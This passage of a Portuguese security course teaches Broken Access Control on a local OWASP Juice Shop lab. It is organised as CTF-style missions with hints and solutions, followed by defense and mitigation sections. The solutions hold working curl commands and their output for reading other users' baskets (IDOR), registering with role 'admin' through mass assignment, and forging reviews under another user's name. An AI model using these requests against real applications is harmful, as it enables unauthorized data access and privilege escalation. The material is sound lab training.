+### 5.3 Missão 1 — O carrinho dos outros (guiada → desafio)
+
+**Cenário:** você é um cliente comum do Juice Shop. Vai provar que consegue ler o
+carrinho de compras de **outros** clientes só trocando um número — um IDOR
+horizontal clássico.
+
+**Seu objetivo:** descobrir **quantos** carrinhos de outros usuários você consegue
+ler e a **soma de todas as quantidades** de produtos somadas nesses carrinhos. A
+flag é `FLAG{carrinhos-soma}`.
+
+Comece criando a **sua** conta de atacante e logando para pegar o token. O cadastro
+é um `POST /api/Users`; o login, um `POST /rest/user/login`.
+
+```console
+$ curl -s -X POST http://juice-shop:3000/api/Users/ \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"atacante@lab.local","password":"Pentest123!",
+         "passwordRepeat":"Pentest123!",
+         "securityQuestion":{"id":1,"question":"x","answer":"x"},
+         "securityAnswer":"x"}' > /dev/null
+
+$ TOKEN=$(curl -s -X POST http://juice-shop:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"atacante@lab.local","password":"Pentest123!"}' \
+    | python3 -c 'import sys,json; print(json.load(sys.stdin)["authentication"]["token"])')
+```
+
+Agora o passo guiado: peça o **seu próprio** carrinho. O número do seu carrinho (o
+`bid`) veio dentro do token; como você acabou de se cadastrar, ele é o maior
+número existente. Veja o formato de uma resposta legítima:
+
+```console
+$ curl -s http://juice-shop:3000/rest/basket/6 -H "Authorization: Bearer $TOKEN"
+{"status":"success","data":{"id":6,"coupon":null,"UserId":25,"Products":[]}}
+```
+
+O seu carrinho (aqui o `6`) está vazio e o `UserId` é o seu. A pergunta do IDOR se
+faz sozinha: **e os carrinhos de número menor?**
+
+<Hint title="Dica 1 — onde estão os outros">
+Os carrinhos dos usuários que já existiam no sistema têm números **menores** que o
+seu. Faça um laço que percorra os ids de `1` até o seu (exclusive) chamando
+`/rest/basket/{id}` com o **seu** token. Os que responderem `200` com um `UserId`
+diferente do seu são carrinhos alheios.
+</Hint>
+
+<Hint title="Dica 2 — somar as quantidades">
+Cada carrinho traz uma lista `Products`, e cada produto tem, em `BasketItem`, um
+campo `quantity`. Para cada carrinho alheio, some os `quantity`; depois some tudo.
+A flag é `FLAG{nº de carrinhos alheios-soma total}`. Um pouco de `python3` lendo o
+JSON resolve sem precisar do `jq`.
+</Hint>
+
+<Solution title="Solução da Missão 1">
+Saída real do lab (carrinhos de id 1 a 5, lidos com o token do atacante cujo
+carrinho é o 6):
+
+```console
+$ for id in 1 2 3 4 5; do
+    curl -s http://juice-shop:3000/rest/basket/$id -H "Authorization: Bearer $TOKEN"
+    echo
+  done | python3 -c '
+import sys, json
+total = 0; n = 0
+for line in sys.stdin:
+    line = line.strip()
+    if not line: continue
+    d = json.loads(line)["data"]
+    n += 1
+    q = sum(p["BasketItem"]["quantity"] for p in d["Products"])
+    total += q
+    print(f"basket {d[\"id\"]} UserId={d[\"UserId\"]} soma_qty={q}")
+print("carrinhos alheios lidos:", n, "| soma total das quantidades:", total)
+'
+basket 1 UserId=1 soma_qty=6
+basket 2 UserId=2 soma_qty=2
+basket 3 UserId=3 soma_qty=1
+basket 4 UserId=11 soma_qty=2
+basket 5 UserId=16 soma_qty=7
+carrinhos alheios lidos: 5 | soma total das quantidades: 18
+```
+
+Cinco carrinhos de outros usuários (ids 1 a 5, inclusive o do admin, que é o
+`UserId=1`), lidos com um token de cliente comum, sem nenhuma checagem de posse. A
+soma das quantidades é 6+2+1+2+7 = **18**. Monte a flag no formato
+`FLAG{carrinhos-soma}` com esses dois números: o total de carrinhos alheios que
+você leu e a soma de todas as quantidades.
+
+Isto resolve o desafio "View Basket" do Juice Shop, da categoria **Broken Access
+Control**.
+</Solution>
+
+<FlagInput task="missao-1-carrinho-alheio" />
+
+### 5.4 Missão 2 — Virar admin no cadastro (desafio central)
+
+**Cenário:** você é um cliente comum e quer o poder de um administrador. Não vai
+quebrar o login do admin (isso seria 4.4); vai conseguir que o **seu próprio**
+cadastro nasça com papel de admin — um escalonamento **vertical** servido pelo
+próprio formulário de registro.
+
+**Seu objetivo:** criar uma conta que, ao logar, traga `role: admin` no token, e
+descobrir **quantas** contas de admin já existiam no sistema. A flag é
+`FLAG{papel-quantidade}`.
+
+O ponto de partida é entender o que o cadastro aceita. Volte ao `POST /api/Users`
+da Missão 1: você mandou e-mail, senha e a pergunta de segurança. A pergunta a
+fazer é: *e se eu mandar um campo a mais?*
+
+<Hint title="Dica 1 — o campo que não deveria obedecer">
+Os usuários têm um campo `role` (o seu nasceu como `customer`). O servidor copia
+para o banco os campos que você manda no cadastro, sem uma lista do que é
+permitido — isto é <GlossaryTerm term="mass assignment">mass assignment</GlossaryTerm>.
+Tente incluir `"role":"admin"` no corpo do `POST /api/Users`.
+</Hint>
+
+<Hint title="Dica 2 — ler o próprio papel e contar os admins">
+Depois de cadastrar e logar, o seu token é um JWT: separe por pontos, pegue a
+**segunda** parte e decodifique de Base64url para ver `role`. Para a contagem,
+liste os usuários (`GET /api/Users`, que — veja só — responde a qualquer usuário
+logado) e conte quantos têm `role:admin`, **sem contar** a conta que você acabou
+de criar. A flag é `FLAG{papel-quantidade}`.
+</Hint>
+
+<Solution title="Solução da Missão 2">
+Cadastro com o campo `role` a mais e login da nova conta:
+
+```console
+$ curl -s -X POST http://juice-shop:3000/api/Users/ \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"admin-lab@lab.local","password":"Pentest123!",
+         "passwordRepeat":"Pentest123!","role":"admin",
+         "securityQuestion":{"id":2,"question":"x","answer":"x"},
+         "securityAnswer":"x"}'
+{"status":"success","data":{"...":"...","email":"admin-lab@lab.local","role":"admin","id":26,"...":"..."}}
+```
+
+O servidor obedeceu ao `role:admin`. Agora logue e leia o papel dentro do token:
+
+```console
+$ ADM=$(curl -s -X POST http://juice-shop:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"admin-lab@lab.local","password":"Pentest123!"}' \
+    | python3 -c 'import sys,json; print(json.load(sys.stdin)["authentication"]["token"])')
+
+$ echo "$ADM" | cut -d. -f2 | tr '_-' '/+' | python3 -c '
+import sys, base64, json
+s = sys.stdin.read().strip(); s += "=" * (-len(s) % 4)
+print("role no token:", json.loads(base64.b64decode(s))["data"]["role"])'
+role no token: admin
+```
+
+E conte os admins que já existiam (sem o seu novo), listando os usuários com o
+próprio token:
+
+```console
+$ curl -s http://juice-shop:3000/api/Users -H "Authorization: Bearer $ADM" | python3 -c '
+import sys, json
+users = json.load(sys.stdin)["data"]
+admins = [u["email"] for u in users if u["role"]=="admin" and u["email"]!="admin-lab@lab.local"]
+print("admins pré-existentes:", len(admins))
+for e in admins: print("  ", e)'
+admins pré-existentes: 8
+   admin@juice-sh.op
+   bjoern.kimminich@gmail.com
+   support@juice-sh.op
+   J12934@juice-sh.op
+   wurstbrot@juice-sh.op
+   bjoern@juice-sh.op
+   testing@juice-sh.op
+   cloud-admin@juice-sh.op
+```
+
+O seu token agora diz `admin`, e havia **8** contas de admin antes da sua — os
+dois valores que montam a flag no formato `FLAG{papel-quantidade}`.
+
+Dois problemas em um só endpoint: o cadastro aceitou que você definisse o próprio
+`role` (mass assignment → escalonamento vertical), e a listagem de todos os
+usuários respondeu a um simples cliente logado (function-level access control
+quebrado). No navegador, com `role:admin`, a opção **Administration** passa a
+aparecer — mas, como você viu na teoria, o que de fato abriu a porta foi o
+servidor aceitar o papel, não a interface mostrar o botão.
+</Solution>
+
+<FlagInput task="missao-2-virar-admin" />
+
+### 5.5 Missão 3 — A review que não é sua (desafio)
+
+**Cenário:** o Juice Shop deixa clientes avaliarem produtos. Você vai publicar uma
+avaliação **assinada por outra pessoa** — abusando de um controle de acesso de
+escrita que confia num campo vindo do cliente. É o mesmo IDOR, agora num `PUT` que
+**altera** dados, não num `GET` que lê.
+
+**Seu objetivo:** publicar uma avaliação no produto cujo autor seja
+`admin@juice-sh.op` (não você) e confirmar na lista de desafios do Juice Shop que
+o desafio de avaliação forjada ficou resolvido. A flag é `FLAG{key-autor}`, onde
+`key` é a chave desse desafio e `autor` é a parte antes do `@` do e-mail que você
+forjou.
+
+O caminho guiado: avaliações se enviam com `PUT /rest/products/{id}/reviews`,
+autenticado. O corpo tem `message` e `author`.
+
+<Hint title="Dica 1 — o campo author é seu para preencher">
+O servidor **não confere** se o `author` do corpo é o seu próprio e-mail. Monte um
+`PUT /rest/products/1/reviews` (produto 1 = Apple Juice) com o seu token e
+`"author":"admin@juice-sh.op"`. Depois leia as avaliações do produto para ver a
+sua, assinada pelo admin.
+</Hint>
+
+<Hint title="Dica 2 — achar a key do desafio resolvido">
+O Juice Shop expõe o próprio placar em `GET /api/Challenges`. Depois de forjar a
+review, filtre os desafios com `solved: true` da categoria `Broken Access Control`
+e ache o que fala de avaliação (seu nome é "Forged Review"). O campo `key` dele
+entra na flag; a parte local do e-mail forjado é o que vem antes do `@`.
+</Hint>
+
+<Solution title="Solução da Missão 3">
+Forjando a avaliação no nome do admin e lendo de volta:
+
+```console
+$ curl -s -X PUT http://juice-shop:3000/rest/products/1/reviews \
+    -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+    -d '{"message":"Avaliacao de teste - lab 4.5","author":"admin@juice-sh.op"}'
+{"status":"success"}
+
+$ curl -s http://juice-shop:3000/rest/products/1/reviews | python3 -c '
+import sys, json
+for r in json.load(sys.stdin)["data"]:
+    print("author:", r.get("author"), "| msg:", r.get("message")[:40])'
+author: admin@juice-sh.op | msg: One of my favorites!
+author: basil@juice-sh.op | msg: Great! We'"'"'ll have an apple party. Every
+author: admin@juice-sh.op | msg: Avaliacao de teste - lab 4.5
+```
+
+A sua avaliação aparece assinada por `admin@juice-sh.op`, embora tenha sido
+enviada com o token do atacante. Agora a key do desafio resolvido:
+
+```console
+$ curl -s http://juice-shop:3000/api/Challenges | python3 -c '
+import sys, json
+for c in json.load(sys.stdin)["data"]:
+    if c["solved"] and c["category"]=="Broken Access Control":
+        print(c["key"], "|", c["name"])'
+basketAccessChallenge | View Basket
+forgedReviewChallenge | Forged Review
+```
+
+O desafio da avaliação forjada é o `forgedReviewChallenge`, e o autor que você
+forjou foi `admin@juice-sh.op` (parte local: `admin`). Junte a key do desafio e a
+parte local do e-mail no formato `FLAG{key-autor}`.
+
+(Note que o `View Basket` também aparece como resolvido — é o resíduo da sua
+Missão 1, outra falha da mesma categoria.)
+</Solution>
+
+<FlagInput task="missao-3-review-forjada" />
+
+### 5.6 Walkthrough: as três falhas vistas pelo defensor (sem flag)
+
+Antes de desligar, olhe as três missões pela ótica de quem conserta — é isto que
+vira recomendação num relatório:
+
+- **Carrinho alheio (IDOR horizontal):** o endpoint `/rest/basket/:id` precisa, no
+  servidor, comparar o dono do carrinho com o usuário do token e recusar quando
+  não baterem. Uma linha de checagem de posse mata a falha.
+- **Virar admin (mass assignment):** o cadastro deve ignorar campos sensíveis
+  vindos do cliente. O `role` nasce fixo (`customer`) no servidor; só um admin
+  autenticado, por um fluxo próprio, muda papel de alguém.
+- **Review forjada (BAC de escrita):** o `author` de uma avaliação é **sempre** o
+  usuário do token, nunca um campo do corpo. Dados de identidade se tomam da
+  sessão, não da requisição.
+
+Repare no padrão: as três curas estão no **servidor**, e nenhuma depende de
+esconder nada no cliente.
+
+### 5.7 Desligar o laboratório
+
+Terminou? Desligue para respeitar a regra de um lab por vez e liberar RAM:
+
+```console
+$ scripts/lab.sh down juice-shop
+```
+
+Pela plataforma, o botão **Desligar** no painel de Laboratório faz o mesmo. Como o
+Juice Shop guarda o estado em memória, subir de novo devolve tudo ao ponto de
+fábrica — inclusive as suas contas de teste somem.
+
+## 6. Variações e aprofundamento
+
+O que você fez são três formas de um mesmo defeito. Vale conhecer as variações que
+aparecem no mundo real e separam quem sabe o básico de quem sabe o assunto.
+
+- **IDOR em todos os verbos.** Você leu um carrinho (`GET`) e escreveu uma review
+  (`PUT`). Procure também `DELETE` (apagar o recurso de outro), `PATCH`/`POST`
+  (editar o perfil, mudar o e-mail de outra conta). O mesmo endpoint pode conferir
+  posse na leitura e esquecer na escrita.
+- **A referência fora da URL.** O id nem sempre está no caminho. Pode estar num
+  parâmetro de query (`?userId=25`), num campo escondido de formulário, num
+  cabeçalho, num cookie ou no corpo JSON. Qualquer valor que o cliente controle e
+  que aponte um objeto é candidato a IDOR — é a essência do
+  <GlossaryTerm term="parameter tampering">parameter tampering</GlossaryTerm>.
+- **IDOR "cego" por efeito colateral.** Às vezes a resposta não mostra os dados,
+  mas a ação acontece: um `POST /transfer?from=OUTRA_CONTA` que não retorna nada
+  mas move o dinheiro. Você confirma pelo efeito, não pela resposta.
+- **Escalonamento vertical sem mass assignment.** Virar admin pelo cadastro é um
+  caminho; outros são: um endpoint de admin sem checagem de papel (forced
+  browsing puro), um parâmetro `isAdmin=true` aceito em algum fluxo, ou um token
+  cujo papel você consegue adulterar (isso cruza com forja de JWT, do 3.4).
+- **BOLA e BFLA em API.** Numa API REST com muitos recursos por id, o IDOR vira
+  <GlossaryTerm term="BOLA">BOLA</GlossaryTerm>, o risco nº 1 do OWASP API
+  Security. Em GraphQL, uma única consulta pode pedir objetos por id em lote,
+  multiplicando a superfície. É o tema do módulo **4.9**.
+- **IDOR mascarado por UUID ou hash.** Encontrar `/doc/9f3c2a…` não significa
+  seguro: cace onde esse identificador **vaza** (outra resposta de API, um e-mail,
+  um log) e teste reusá-lo com outra conta.
+
+## 7. Erros comuns
+
+- **Confundir 403 da interface com proteção real.** A tela pode esconder o botão
+  e o endpoint continuar aberto (foi a sua Missão 2). Sempre teste a API direto,
+  com `curl` ou Burp — não confie no que o front mostra ou esconde.
+- **Testar só `GET`.** Metade das falhas graves está em `PUT`/`POST`/`DELETE`.
+  Repita a troca de referência em cada verbo que o endpoint aceitar.
+- **Achar que UUID = seguro.** Id não adivinhável não é id protegido. Sem checagem
+  de posse no servidor, quem obtém o identificador (e eles vazam) entra.
+- **Parar no primeiro 200 e não medir impacto.** Um IDOR num recurso bobo é
+  diferente de um em dados sensíveis. Entenda **o que** você alcançou antes de
+  relatar — e, em sistema real, pare no mínimo para provar, sem baixar dados de
+  terceiros.
+- **Não logar com uma segunda conta.** Para confirmar um IDOR horizontal, tenha
+  **duas** contas suas: acesse com a conta A o recurso que pertence à conta B. Isso
+  prova a falha sem tocar em dados de pessoas reais.
+- **Quebrar o estado do lab e achar que "não funciona".** Se você bagunçou os
+  dados (muitas contas, muitas reviews), derrube e suba o lab de novo
+  (`scripts/lab.sh down juice-shop` e `up`): o Juice Shop reseta por completo.
+
+## 8. Defesa e mitigação
+
+Aqui fecha a visão completa. A boa notícia: a cura do Broken Access Control é
+conceitualmente simples e quase sempre mora **no servidor**. A má notícia: ela tem
+de estar em **todo** endpoint, sem exceção — e é o "sem exceção" que falha.
+
+### 8.1 A regra de ouro: autorizar por objeto e por função, no servidor
+
+Para **cada** requisição que toca um recurso, o servidor responde duas perguntas,
+nessa ordem, **depois** de autenticar:
+
+1. **Posse (nível de objeto):** este objeto pertence (ou é permitido) ao usuário
+   do token? Mata o IDOR horizontal.
+2. **Papel/permissão (nível de função):** este usuário pode executar esta
+   operação? Mata o escalonamento vertical.
+
+No endpoint do carrinho, a cura do IDOR da Missão 1 é literalmente uma checagem de
+posse antes de responder (pseudocódigo no estilo Node/Express do Juice Shop):
+
+```js
+// Antes (vulnerável): devolve o carrinho pedido sem conferir o dono.
+app.get("/rest/basket/:id", (req, res) => {
+  const basket = db.baskets.find(req.params.id);
+  res.json(basket);
+});
+
+// Depois (seguro): nega por padrão se o carrinho não for do usuário do token.
+app.get("/rest/basket/:id", requireAuth, (req, res) => {
+  const basket = db.baskets.find(req.params.id);
+  if (!basket || basket.UserId !== req.user.id) {
+    return res.sendStatus(404); // 404 não confirma nem a existência
+  }
+  res.json(basket);
+});
+```
+
+### 8.2 Negar por padrão e menor privilégio
+
+- <GlossaryTerm term="deny by default">**Deny by default**</GlossaryTerm>: todo
+  recurso nasce **fechado**; o acesso é a exceção que se concede explicitamente.
+  Assim, um endpoint novo que alguém esqueceu de proteger falha para o lado
+  seguro (negando), não para o aberto.
+- <GlossaryTerm term="principle of least privilege">**Menor privilégio**</GlossaryTerm>:
+  cada papel recebe só o que precisa. Um cliente não lê a lista de todos os
+  usuários (a falha extra da Missão 2); um endpoint administrativo exige papel de
+  admin **no servidor**.
+
+### 8.3 Centralizar a decisão (RBAC) em vez de espalhar `if`
+
+Verificações de acesso soltas, repetidas em cada rota, são onde o "sem exceção"
+quebra: basta uma rota esquecer o `if`. O remédio é centralizar — um
+<GlossaryTerm term="RBAC">RBAC</GlossaryTerm> (controle por papéis) ou um
+middleware de autorização por onde **toda** requisição passa, de modo que proteger
+uma rota seja declarar a permissão, não reescrever a checagem.
+
+```js
+// Middleware reaproveitável: a rota declara a permissão exigida.
+app.delete("/api/Users/:id", requireAuth, requireRole("admin"), handler);
+app.get("/rest/basket/:id", requireAuth, requireOwnership("basket"), handler);
+```
+
+### 8.4 Fechar o mass assignment
+
+Nunca ligue o corpo da requisição direto ao modelo. Use uma **allowlist** dos
+campos que o cliente pode definir; campos sensíveis (`role`, `isAdmin`, `saldo`,
+`UserId`) ficam de fora e são definidos pelo servidor.
+
+```js
+// Vulnerável: User.create(req.body) copiaria role=admin vindo do cliente.
+// Seguro: só os campos permitidos entram; role nasce fixo no servidor.
+const { email, password, securityAnswer } = req.body;
+await User.create({ email, password, securityAnswer, role: "customer" });
+```
+
+### 8.5 Camadas que ajudam (mas não substituem a checagem)
+
+- **Responder 404 em vez de 403** para não confirmar nem que o objeto existe.
+- **Identificadores difíceis de adivinhar** (UUID) como camada extra — nunca como
+  a única.
+- **Logar e monitorar** acessos negados e padrões de varredura de ids (muitos
+  404/403 seguidos de um IP) para detectar quem está testando IDOR.
+- **Testes automatizados de autorização**: para cada endpoint, um teste que tenta
+  acessar o recurso de outro usuário e **espera** um 403/404. É o que pega a
+  regressão quando alguém adiciona uma rota e esquece a checagem.
+
+## 9. Exercícios
+
+### Desafios práticos (sem flag)
+
+1. **Prove o IDOR com duas contas.** Crie uma segunda conta de cliente, ponha um
+   produto no carrinho dela e, logado com a **primeira** conta, leia esse carrinho
+   pelo id. Essa é a forma correta de confirmar um IDOR horizontal sem tocar em
+   dados de terceiros.
+2. **Teste os verbos.** Com o seu token de cliente, tente um `GET` no perfil de
+   outro usuário e depois um método de escrita (`PUT`/`PATCH`) sobre um recurso que
+   não é seu. Anote quais o servidor barra e quais aceita — e qual código devolve.
+3. **Forced browsing manual.** Sem usar a interface, descubra ao menos um endpoint
+   que a tela de cliente não oferece e peça-o direto com `curl`. Classifique a
+   resposta (200/401/403/404) e diga se é falha de função ou defesa correta.
+4. **Escreva a recomendação.** Para cada uma das três missões, redija a correção em
+   duas frases, no estilo de um relatório: o que fazer e onde (servidor, qual
+   checagem).
+
+### Quiz
+
+<Quiz task="quiz-final" />
+
+## 10. Resumo e glossário
+
+Você viu que estar logado não é estar autorizado: o Broken Access Control é a
+falha nº 1 da web justamente porque a verificação de "você pode fazer isto?" é
+fácil de esquecer em algum endpoint. Explorou as duas direções — horizontal (ler
+o carrinho alheio) e vertical (virar admin no cadastro) — e uma falha de escrita
+(forjar uma review), todas com o mesmo diagnóstico: o servidor autentica, mas não
+confere posse e papel por requisição. E viu que a cura mora no servidor, nunca em
+esconder botões no cliente.
+
+### Cola rápida
+
+- **Autenticação ≠ autorização.** O atacante de um IDOR está **logado**.
+- **IDOR:** trocar uma referência direta (id, UUID, arquivo) para alcançar o objeto
+  de outro, porque falta a checagem de posse. UUID não cura.
+- **Horizontal:** outro usuário, mesmo nível. **Vertical:** nível maior (virar
+  admin). **Mass assignment:** o cadastro aceitar um `role` vindo do cliente.
+- **Controle no cliente é decoração:** teste a API direto; alcançar a função
+  escondida é **forced browsing**.
+- **Defesa:** negar por padrão; checar posse (objeto) e papel (função) **no
+  servidor**, a cada requisição; allowlist contra mass assignment; centralizar em
+  RBAC.
+- **Em API:** IDOR vira **BOLA**, o risco nº 1 do OWASP API Security (gancho do 4.9).
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- OWASP Top 10 — [A01:2021 Broken Access Control](https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/).
+- OWASP API Security Top 10 — [API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/).
+- OWASP Cheat Sheet — [Authorization](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
+  e [Insecure Direct Object Reference Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html).
